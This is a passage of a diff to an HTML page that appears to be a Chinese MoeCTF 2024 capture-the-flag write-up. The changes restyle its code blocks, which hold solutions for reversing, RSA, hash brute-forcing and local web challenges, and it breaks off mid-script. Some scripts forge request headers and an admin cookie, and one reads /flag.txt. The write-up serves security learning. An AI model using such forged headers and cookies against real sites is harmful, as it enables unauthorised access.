-    # 将 .xml 文件重命名为 .html
-    new_name=&quot;${base_name}.html&quot;
-    mv &quot;$file&quot; &quot;$new_name&quot;
+<span class="w">    </span><span class="c1"># 将 .xml 文件重命名为 .html</span>
+<span class="w">    </span><span class="nv">new_name</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">base_name</span><span class="si">}</span><span class="s2">.html&quot;</span>
+<span class="w">    </span>mv<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$file</span><span class="s2">&quot;</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$new_name</span><span class="s2">&quot;</span>
 
-    # 生成目标目录的路径 (如 f572d396fae9206628714fb2ce00f72e94f2258f.txt -&gt; f5/72/f572d396fae9206628714fb2ce00f72e94f2258f.txt)
-    prefix1=&quot;${base_name:0:2}&quot;  # 前两位
-    prefix2=&quot;${base_name:2:2}&quot;  # 第三和第四位
+<span class="w">    </span><span class="c1"># 生成目标目录的路径 (如 f572d396fae9206628714fb2ce00f72e94f2258f.txt -&gt; f5/72/f572d396fae9206628714fb2ce00f72e94f2258f.txt)</span>
+<span class="w">    </span><span class="nv">prefix1</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">base_name</span><span class="p">:</span><span class="nv">0</span><span class="p">:</span><span class="nv">2</span><span class="si">}</span><span class="s2">&quot;</span><span class="w">  </span><span class="c1"># 前两位</span>
+<span class="w">    </span><span class="nv">prefix2</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">base_name</span><span class="p">:</span><span class="nv">2</span><span class="p">:</span><span class="nv">2</span><span class="si">}</span><span class="s2">&quot;</span><span class="w">  </span><span class="c1"># 第三和第四位</span>
 
-    # 创建目标目录，如果目录不存在，基于 /var/www/html
-    target_dir=&quot;${target_base}/${prefix1}/${prefix2}&quot;
-    mkdir -p &quot;$target_dir&quot;
+<span class="w">    </span><span class="c1"># 创建目标目录，如果目录不存在，基于 /var/www/html</span>
+<span class="w">    </span><span class="nv">target_dir</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">target_base</span><span class="si">}</span><span class="s2">/</span><span class="si">${</span><span class="nv">prefix1</span><span class="si">}</span><span class="s2">/</span><span class="si">${</span><span class="nv">prefix2</span><span class="si">}</span><span class="s2">&quot;</span>
+<span class="w">    </span>mkdir<span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$target_dir</span><span class="s2">&quot;</span>
 
-    # 将重命名后的文件移动到目标目录
-    mv &quot;$new_name&quot; &quot;$target_dir/&quot;
-  fi
-done
+<span class="w">    </span><span class="c1"># 将重命名后的文件移动到目标目录</span>
+<span class="w">    </span>mv<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$new_name</span><span class="s2">&quot;</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$target_dir</span><span class="s2">/&quot;</span>
+<span class="w">  </span><span class="k">fi</span>
+<span class="k">done</span>
 
-# 处理 .txt 文件：直接分类
-for file in *.txt; do
-  # 判断文件是否存在，避免没有 .txt 文件时报错
-  if [[ -f &quot;$file&quot; ]]; then
-    # 获取文件的基础名字（不含后缀）
-    base_name=&quot;${file%.txt}&quot;
+<span class="c1"># 处理 .txt 文件：直接分类</span>
+<span class="k">for</span><span class="w"> </span>file<span class="w"> </span><span class="k">in</span><span class="w"> </span>*.txt<span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">  </span><span class="c1"># 判断文件是否存在，避免没有 .txt 文件时报错</span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="o">[[</span><span class="w"> </span>-f<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$file</span><span class="s2">&quot;</span><span class="w"> </span><span class="o">]]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+<span class="w">    </span><span class="c1"># 获取文件的基础名字（不含后缀）</span>
+<span class="w">    </span><span class="nv">base_name</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">file</span><span class="p">%.txt</span><span class="si">}</span><span class="s2">&quot;</span>
 
-    # 生成目标目录的路径 (如 f572d396fae9206628714fb2ce00f72e94f2258f.txt -&gt; f5/72/f572d396fae9206628714fb2ce00f72e94f2258f.txt)
-    prefix1=&quot;${base_name:0:2}&quot;  # 前两位
-    prefix2=&quot;${base_name:2:2}&quot;  # 第三和第四位
+<span class="w">    </span><span class="c1"># 生成目标目录的路径 (如 f572d396fae9206628714fb2ce00f72e94f2258f.txt -&gt; f5/72/f572d396fae9206628714fb2ce00f72e94f2258f.txt)</span>
+<span class="w">    </span><span class="nv">prefix1</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">base_name</span><span class="p">:</span><span class="nv">0</span><span class="p">:</span><span class="nv">2</span><span class="si">}</span><span class="s2">&quot;</span><span class="w">  </span><span class="c1"># 前两位</span>
+<span class="w">    </span><span class="nv">prefix2</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">base_name</span><span class="p">:</span><span class="nv">2</span><span class="p">:</span><span class="nv">2</span><span class="si">}</span><span class="s2">&quot;</span><span class="w">  </span><span class="c1"># 第三和第四位</span>
 
-    # 创建目标目录，如果目录不存在，基于 /var/www/html
-    target_dir=&quot;${target_base}/${prefix1}/${prefix2}&quot;
-    mkdir -p &quot;$target_dir&quot;
+<span class="w">    </span><span class="c1"># 创建目标目录，如果目录不存在，基于 /var/www/html</span>
+<span class="w">    </span><span class="nv">target_dir</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">target_base</span><span class="si">}</span><span class="s2">/</span><span class="si">${</span><span class="nv">prefix1</span><span class="si">}</span><span class="s2">/</span><span class="si">${</span><span class="nv">prefix2</span><span class="si">}</span><span class="s2">&quot;</span>
+<span class="w">    </span>mkdir<span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$target_dir</span><span class="s2">&quot;</span>
 
-    # 将 .txt 文件移动到目标目录
-    mv &quot;$file&quot; &quot;$target_dir/&quot;
-  fi
-done
+<span class="w">    </span><span class="c1"># 将 .txt 文件移动到目标目录</span>
+<span class="w">    </span>mv<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$file</span><span class="s2">&quot;</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$target_dir</span><span class="s2">/&quot;</span>
+<span class="w">  </span><span class="k">fi</span>
+<span class="k">done</span>
 
-echo &quot;All .xml files have been renamed to .html and moved to /var/www/html.&quot;
-echo &quot;.txt files have been moved to /var/www/html.&quot;
-########
-cd /var/log/nginx/
-cat access.log # 得到 flag：moectf{YeS_d3vOpS-is-THE-JOB_FoR_tHe_Gre@T_INT3rnET5f}
-</code></pre>
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;All .xml files have been renamed to .html and moved to /var/www/html.&quot;</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;.txt files have been moved to /var/www/html.&quot;</span>
+<span class="c1">########</span>
+<span class="nb">cd</span><span class="w"> </span>/var/log/nginx/
+cat<span class="w"> </span>access.log<span class="w"> </span><span class="c1"># 得到 flag：moectf{YeS_d3vOpS-is-THE-JOB_FoR_tHe_Gre@T_INT3rnET5f}</span>
+</code></pre></div>
 <h4 id="libc">哦不！我的libc！</h4>
 <p>使用 <code>ssh root@127.0.0.1 -p &lt;端口&gt;</code> 连接到服务器，然后 <code>echo $(&lt; /flag.txt)</code>。原理：<code>echo</code> 是 shell 内置的命令，不依赖于外部库，且可以通过 I/O 重定向读取文件。</p>
 <h3 id="_14">逆向工程</h3>
@@ -3908,102 +3947,102 @@ cat access.log # 得到 flag：moectf{YeS_d3vOpS-is-THE-JOB_FoR_tHe_Gre@T_INT3rn
 <h4 id="xor">xor</h4>
 <p><img alt="" src="../attachments/Pasted%20image%2020241011014131.png" /></p>
 <p>IDA 阅读得知该程序将输入字符与 0x24 异或之后与另一个值作比较，则只需要把另一个值和 0x24 异或即得 flag，python 脚本如下：</p>
-<pre><code class="language-python"># byte_1400022B8 的字节数组
-byte_1400022B8 = [
-    73, 75, 65, 71, 80, 66, 95, 65, 28, 22, 70, 16, 19,
-    28, 64, 9, 66, 22, 70, 28, 9, 16, 16, 66, 29, 9,
-    70, 21, 20, 20, 9, 23, 22, 20, 65, 64, 64, 22,
-    20, 71, 18, 64, 20, 89
-]
+<div class="highlight"><pre><span></span><code><span class="c1"># byte_1400022B8 的字节数组</span>
+<span class="n">byte_1400022B8</span> <span class="o">=</span> <span class="p">[</span>
+    <span class="mi">73</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">65</span><span class="p">,</span> <span class="mi">71</span><span class="p">,</span> <span class="mi">80</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">95</span><span class="p">,</span> <span class="mi">65</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">22</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span>
+    <span class="mi">28</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">22</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">29</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span>
+    <span class="mi">70</span><span class="p">,</span> <span class="mi">21</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="mi">22</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="mi">65</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="mi">22</span><span class="p">,</span>
+    <span class="mi">20</span><span class="p">,</span> <span class="mi">71</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="mi">89</span>
+<span class="p">]</span>
 
-# 恢复 flag
-flag = ''.join([chr(b ^ 0x24) for b in byte_1400022B8])
+<span class="c1"># 恢复 flag</span>
+<span class="n">flag</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="nb">chr</span><span class="p">(</span><span class="n">b</span> <span class="o">^</span> <span class="mh">0x24</span><span class="p">)</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">byte_1400022B8</span><span class="p">])</span>
 
-# 打印结果
-print(f&quot;Recovered flag: {flag}&quot;) # moectf{e82b478d-f2b8-44f9-b100-320edd20c6d0}
-</code></pre>
+<span class="c1"># 打印结果</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Recovered flag: </span><span class="si">{</span><span class="n">flag</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span> <span class="c1"># moectf{e82b478d-f2b8-44f9-b100-320edd20c6d0}</span>
+</code></pre></div>
 <h4 id="upx">upx</h4>
 <p>使用 Exeinfo 工具得知使用 upx 加壳，使用 <code>upx.exe -d</code> 脱壳后丢进 IDA 进行分析，直接就能看到 flag：<code>moectf{ec5390dd-f8cf-4b02-bc29-3bb0c5604c29}</code>。</p>
 <p><img alt="" src="../attachments/Pasted%20image%2020241011015542.png" /></p>
 <h3 id="_16">现代密码学</h3>
 <h4 id="_17">现代密码学入门指北</h4>
-<pre><code class="language-python">from sympy import mod_inverse
-from Crypto.Util.number import long_to_bytes
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">sympy</span> <span class="kn">import</span> <span class="n">mod_inverse</span>
+<span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">long_to_bytes</span>
 
-p = 197380555956482914197022424175976066223
-q = 205695522197318297682903544013139543071
-n = 40600296529065757616876034307502386207424439675894291036278463517602256790833
-e = 65537
-c = 36450632910287169149899281952743051320560762944710752155402435752196566406306
+<span class="n">p</span> <span class="o">=</span> <span class="mi">197380555956482914197022424175976066223</span>
+<span class="n">q</span> <span class="o">=</span> <span class="mi">205695522197318297682903544013139543071</span>
+<span class="n">n</span> <span class="o">=</span> <span class="mi">40600296529065757616876034307502386207424439675894291036278463517602256790833</span>
+<span class="n">e</span> <span class="o">=</span> <span class="mi">65537</span>
+<span class="n">c</span> <span class="o">=</span> <span class="mi">36450632910287169149899281952743051320560762944710752155402435752196566406306</span>
 
-# Step 1: Calculate φ(n)
-phi_n = (p - 1) * (q - 1)
+<span class="c1"># Step 1: Calculate φ(n)</span>
+<span class="n">phi_n</span> <span class="o">=</span> <span class="p">(</span><span class="n">p</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">q</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
 
-# Step 2: Calculate the private key d
-d = mod_inverse(e, phi_n)
+<span class="c1"># Step 2: Calculate the private key d</span>
+<span class="n">d</span> <span class="o">=</span> <span class="n">mod_inverse</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="n">phi_n</span><span class="p">)</span>
 
-# Step 3: Decrypt the ciphertext c to get the message m
-m = pow(c, d, n)
+<span class="c1"># Step 3: Decrypt the ciphertext c to get the message m</span>
+<span class="n">m</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
 
-# Step 4: Convert m back to the original message
-flag = long_to_bytes(m)
-print(flag) # moectf{the_way_to_crypto}
-</code></pre>
+<span class="c1"># Step 4: Convert m back to the original message</span>
+<span class="n">flag</span> <span class="o">=</span> <span class="n">long_to_bytes</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span> <span class="c1"># moectf{the_way_to_crypto}</span>
+</code></pre></div>
 <h4 id="signin_1">Signin</h4>
-<pre><code class="language-python">from Crypto.Util.number import long_to_bytes, inverse
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">long_to_bytes</span><span class="p">,</span> <span class="n">inverse</span>
 
-# 给定的参数
-c = 5654386228732582062836480859915557858019553457231956237167652323191768422394980061906028416785155458721240012614551996577092521454960121688179565370052222983096211611352630963027300416387011219744891121506834201808533675072141450111382372702075488292867077512403293072053681315714857246273046785264966933854754543533442866929316042885151966997466549713023923528666038905359773392516627983694351534177829247262148749867874156066768643169675380054673701641774814655290118723774060082161615682005335103074445205806731112430609256580951996554318845128022415956933291151825345962528562570998777860222407032989708801549746
-pq = 18047017539289114275195019384090026530425758236625347121394903879980914618669633902668100353788910470141976640337675700570573127020693081175961988571621759711122062452192526924744760561788625702044632350319245961013430665853071569777307047934247268954386678746085438134169871118814865536503043639618655569687154230787854196153067547938936776488741864214499155892870610823979739278296501074632962069426593691194105670021035337609896886690049677222778251559566664735419100459953672218523709852732976706321086266274840999100037702428847290063111455101343033924136386513077951516363739936487970952511422443500922412450462
-qp = 18047017539289114275195019384090026530425758236625347121394903879980914618669633902668100353788910470141976640337675700570573127020693081175961988571621759711122062452192526924744760561788625702044632350319245961013430665853071569777307047934247268954386678746085438134169871118814865536503043639618655569687077087914198877794354459669808240133383828356379423767736753506794441545506312066344576298453957064590180141648690226266236642320508613544047037110363523129966437840660693885863331837516125853621802358973786440314619135781324447765480391038912783714312479080029167695447650048419230865326299964671353746764860
-n = 18047017539289114275195019384090026530425758236625347121394903879980914618669633902668100353788910470141976640337675700570573127020693081175961988571621759711122062452192526924744760561788625702044632350319245961013430665853071569777307047934247268954386678746085438134169871118814865536503043639618655569687534959910892789661065614807265825078942931717855566686073463382398417205648946713373617006449901977718981043020664616841303517708207413215548110294271101267236070252015782044263961319221848136717220979435486850254298686692230935985442120369913666939804135884857831857184001072678312992442792825575636200505903
-p_q = 279533706577501791569740668595544511920056954944184570513187478007551195831693428589898548339751066551225424790534556602157835468618845221423643972870671556362200734472399328046960316064864571163851111207448753697980178391430044714097464866523838747053135392202848167518870720149808055682621080992998747265496
+<span class="c1"># 给定的参数</span>
+<span class="n">c</span> <span class="o">=</span> <span class="mi">5654386228732582062836480859915557858019553457231956237167652323191768422394980061906028416785155458721240012614551996577092521454960121688179565370052222983096211611352630963027300416387011219744891121506834201808533675072141450111382372702075488292867077512403293072053681315714857246273046785264966933854754543533442866929316042885151966997466549713023923528666038905359773392516627983694351534177829247262148749867874156066768643169675380054673701641774814655290118723774060082161615682005335103074445205806731112430609256580951996554318845128022415956933291151825345962528562570998777860222407032989708801549746</span>
+<span class="n">pq</span> <span class="o">=</span> <span class="mi">18047017539289114275195019384090026530425758236625347121394903879980914618669633902668100353788910470141976640337675700570573127020693081175961988571621759711122062452192526924744760561788625702044632350319245961013430665853071569777307047934247268954386678746085438134169871118814865536503043639618655569687154230787854196153067547938936776488741864214499155892870610823979739278296501074632962069426593691194105670021035337609896886690049677222778251559566664735419100459953672218523709852732976706321086266274840999100037702428847290063111455101343033924136386513077951516363739936487970952511422443500922412450462</span>
+<span class="n">qp</span> <span class="o">=</span> <span class="mi">18047017539289114275195019384090026530425758236625347121394903879980914618669633902668100353788910470141976640337675700570573127020693081175961988571621759711122062452192526924744760561788625702044632350319245961013430665853071569777307047934247268954386678746085438134169871118814865536503043639618655569687077087914198877794354459669808240133383828356379423767736753506794441545506312066344576298453957064590180141648690226266236642320508613544047037110363523129966437840660693885863331837516125853621802358973786440314619135781324447765480391038912783714312479080029167695447650048419230865326299964671353746764860</span>
+<span class="n">n</span> <span class="o">=</span> <span class="mi">18047017539289114275195019384090026530425758236625347121394903879980914618669633902668100353788910470141976640337675700570573127020693081175961988571621759711122062452192526924744760561788625702044632350319245961013430665853071569777307047934247268954386678746085438134169871118814865536503043639618655569687534959910892789661065614807265825078942931717855566686073463382398417205648946713373617006449901977718981043020664616841303517708207413215548110294271101267236070252015782044263961319221848136717220979435486850254298686692230935985442120369913666939804135884857831857184001072678312992442792825575636200505903</span>
+<span class="n">p_q</span> <span class="o">=</span> <span class="mi">279533706577501791569740668595544511920056954944184570513187478007551195831693428589898548339751066551225424790534556602157835468618845221423643972870671556362200734472399328046960316064864571163851111207448753697980178391430044714097464866523838747053135392202848167518870720149808055682621080992998747265496</span>
 
-# 解方程恢复 p 和 q
-from sympy import symbols, Eq, solve
+<span class="c1"># 解方程恢复 p 和 q</span>
+<span class="kn">from</span> <span class="nn">sympy</span> <span class="kn">import</span> <span class="n">symbols</span><span class="p">,</span> <span class="n">Eq</span><span class="p">,</span> <span class="n">solve</span>
 
-p, q = symbols('p q', integer=True, positive=True)
-eq1 = Eq((p - 1) * (q - 2), pq)
-eq2 = Eq((q - 1) * (p - 2), qp)
-eq3 = Eq(p + q, p_q)
-solutions = solve([eq1, eq2, eq3], (p, q))
+<span class="n">p</span><span class="p">,</span> <span class="n">q</span> <span class="o">=</span> <span class="n">symbols</span><span class="p">(</span><span class="s1">&#39;p q&#39;</span><span class="p">,</span> <span class="n">integer</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">positive</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+<span class="n">eq1</span> <span class="o">=</span> <span class="n">Eq</span><span class="p">((</span><span class="n">p</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">q</span> <span class="o">-</span> <span class="mi">2</span><span class="p">),</span> <span class="n">pq</span><span class="p">)</span>
+<span class="n">eq2</span> <span class="o">=</span> <span class="n">Eq</span><span class="p">((</span><span class="n">q</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">p</span> <span class="o">-</span> <span class="mi">2</span><span class="p">),</span> <span class="n">qp</span><span class="p">)</span>
+<span class="n">eq3</span> <span class="o">=</span> <span class="n">Eq</span><span class="p">(</span><span class="n">p</span> <span class="o">+</span> <span class="n">q</span><span class="p">,</span> <span class="n">p_q</span><span class="p">)</span>
+<span class="n">solutions</span> <span class="o">=</span> <span class="n">solve</span><span class="p">([</span><span class="n">eq1</span><span class="p">,</span> <span class="n">eq2</span><span class="p">,</span> <span class="n">eq3</span><span class="p">],</span> <span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">q</span><span class="p">))</span>
 
-# 选择正确的解
-for sol in solutions:
-    if sol[0] * sol[1] == n:
-        p, q = sol
-        break
+<span class="c1"># 选择正确的解</span>
+<span class="k">for</span> <span class="n">sol</span> <span class="ow">in</span> <span class="n">solutions</span><span class="p">:</span>
+    <span class="k">if</span> <span class="n">sol</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="n">sol</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="n">n</span><span class="p">:</span>
+        <span class="n">p</span><span class="p">,</span> <span class="n">q</span> <span class="o">=</span> <span class="n">sol</span>
+        <span class="k">break</span>
 
-# 计算私钥 d
-phi_n = int((p - 1) * (q - 1))
-e = 65537
-d = inverse(e, phi_n)
+<span class="c1"># 计算私钥 d</span>
+<span class="n">phi_n</span> <span class="o">=</span> <span class="nb">int</span><span class="p">((</span><span class="n">p</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">q</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span>
+<span class="n">e</span> <span class="o">=</span> <span class="mi">65537</span>
+<span class="n">d</span> <span class="o">=</span> <span class="n">inverse</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="n">phi_n</span><span class="p">)</span>
 
-# 解密得到消息 m
-m = pow(c, d, n)
-flag = long_to_bytes(m)
-print(flag.decode()) # moectf{Just_4_signin_ch4ll3ng3_for_y0u}
-</code></pre>
+<span class="c1"># 解密得到消息 m</span>
+<span class="n">m</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
+<span class="n">flag</span> <span class="o">=</span> <span class="n">long_to_bytes</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span> <span class="c1"># moectf{Just_4_signin_ch4ll3ng3_for_y0u}</span>
+</code></pre></div>
 <h4 id="ez_hash">ez_hash</h4>
-<pre><code class="language-python">import hashlib
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">hashlib</span>
 
-# 给定的哈希值
-target_hash = &quot;3a5137149f705e4da1bf6742e62c018e3f7a1784ceebcb0030656a2b42f50b6a&quot;
+<span class="c1"># 给定的哈希值</span>
+<span class="n">target_hash</span> <span class="o">=</span> <span class="s2">&quot;3a5137149f705e4da1bf6742e62c018e3f7a1784ceebcb0030656a2b42f50b6a&quot;</span>
 
-# 初始值
-prefix = b&quot;2100&quot;
+<span class="c1"># 初始值</span>
+<span class="n">prefix</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;2100&quot;</span>
 
-# 尝试所有可能的数字后缀
-for i in range(1000000):  # 生成000000到999999
-    suffix = f&quot;{i:06}&quot;.encode()  # 将整数格式化为6位数，并编码为字节串
-    secrets = prefix + suffix
-    hash_value = hashlib.sha256(secrets).hexdigest()
-    if hash_value == target_hash:
-        print(f&quot;Found secrets: {secrets}&quot;)
-        break
-# Found secrets: b'2100360168'
-# moectf{2100360168}
-</code></pre>
+<span class="c1"># 尝试所有可能的数字后缀</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1000000</span><span class="p">):</span>  <span class="c1"># 生成000000到999999</span>
+    <span class="n">suffix</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">i</span><span class="si">:</span><span class="s2">06</span><span class="si">}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>  <span class="c1"># 将整数格式化为6位数，并编码为字节串</span>
+    <span class="n">secrets</span> <span class="o">=</span> <span class="n">prefix</span> <span class="o">+</span> <span class="n">suffix</span>
+    <span class="n">hash_value</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">(</span><span class="n">secrets</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+    <span class="k">if</span> <span class="n">hash_value</span> <span class="o">==</span> <span class="n">target_hash</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Found secrets: </span><span class="si">{</span><span class="n">secrets</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="k">break</span>
+<span class="c1"># Found secrets: b&#39;2100360168&#39;</span>
+<span class="c1"># moectf{2100360168}</span>
+</code></pre></div>
 <h3 id="web">Web渗透测试与审计</h3>
 <h4 id="web_1">Web渗透测试与审计入门指北</h4>
 <p>使用 phpstudy 搭建网站得到 flag：<code>moectf{H3r3'5_@_flYinG_kIss_f0r_yoU!}</code></p>
@@ -4012,133 +4051,133 @@ for i in range(1000000):  # 生成000000到999999
 <h4 id="01-moectf">垫刀之路01: MoeCTF？启动！</h4>
 <p>env 命令拿到 flag：<code>moectf{WelCOme-To_mO3cTF-@nD-Road1-sT4RTup-By-5XRHhhb7}</code></p>
 <h4 id="ez_http">ez_http</h4>
-<pre><code class="language-python">import requests
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">requests</span>
 
-# Get
-url = &quot;http://127.0.0.1:3305/?xt=大帅b&quot;
+<span class="c1"># Get</span>
+<span class="n">url</span> <span class="o">=</span> <span class="s2">&quot;http://127.0.0.1:3305/?xt=大帅b&quot;</span>
 
-# Post
-data = {
-    'imoau':'sb'
-}
+<span class="c1"># Post</span>
+<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s1">&#39;imoau&#39;</span><span class="p">:</span><span class="s1">&#39;sb&#39;</span>
+<span class="p">}</span>
 
-headers = {
-    'Referer': 'https://www.xidian.edu.cn/', # Source
-    'User-Agent': 'MoeDedicatedBrowser',     # UA
-    'X-Forwarded-For': '127.0.0.1'           # 伪造请求源
-}
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s1">&#39;Referer&#39;</span><span class="p">:</span> <span class="s1">&#39;https://www.xidian.edu.cn/&#39;</span><span class="p">,</span> <span class="c1"># Source</span>
+    <span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;MoeDedicatedBrowser&#39;</span><span class="p">,</span>     <span class="c1"># UA</span>
+    <span class="s1">&#39;X-Forwarded-For&#39;</span><span class="p">:</span> <span class="s1">&#39;127.0.0.1&#39;</span>           <span class="c1"># 伪造请求源</span>
+<span class="p">}</span>
 
-# Cookie
-cookies = {
-    'user': 'admin'
-}
+<span class="c1"># Cookie</span>
+<span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s1">&#39;user&#39;</span><span class="p">:</span> <span class="s1">&#39;admin&#39;</span>
+<span class="p">}</span>
 
-response = requests.post(url, data=data, headers=headers, cookies=cookies)
+<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>
 
-# 输出响应内容
-print(response.text)
-</code></pre>
+<span class="c1"># 输出响应内容</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</code></pre></div>
 <p>通过多次发请求完善提交的数据，得到如上代码，最终得到 <code>moectf{YoU_@re_real1Y_reaLly-v3rY-cIEVer!!!487ee}</code>。</p>
 <h4 id="proveyourlove">ProveYourLove</h4>
-<pre><code class="language-python">import requests
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">requests</span>
 
-url = 'http://127.0.0.1:11539/questionnaire'
+<span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://127.0.0.1:11539/questionnaire&#39;</span>
 
-data = {
-  &quot;nickname&quot;: &quot;1&quot;,
-  &quot;user_gender&quot;: &quot;male&quot;,
-  &quot;target&quot;: &quot;1&quot;,
-  &quot;target_gender&quot;: &quot;male&quot;,
-  &quot;message&quot;: &quot;1&quot;,
-  &quot;anonymous&quot;: &quot;false&quot;
-}
+<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+  <span class="s2">&quot;nickname&quot;</span><span class="p">:</span> <span class="s2">&quot;1&quot;</span><span class="p">,</span>
+  <span class="s2">&quot;user_gender&quot;</span><span class="p">:</span> <span class="s2">&quot;male&quot;</span><span class="p">,</span>
+  <span class="s2">&quot;target&quot;</span><span class="p">:</span> <span class="s2">&quot;1&quot;</span><span class="p">,</span>
+  <span class="s2">&quot;target_gender&quot;</span><span class="p">:</span> <span class="s2">&quot;male&quot;</span><span class="p">,</span>
+  <span class="s2">&quot;message&quot;</span><span class="p">:</span> <span class="s2">&quot;1&quot;</span><span class="p">,</span>
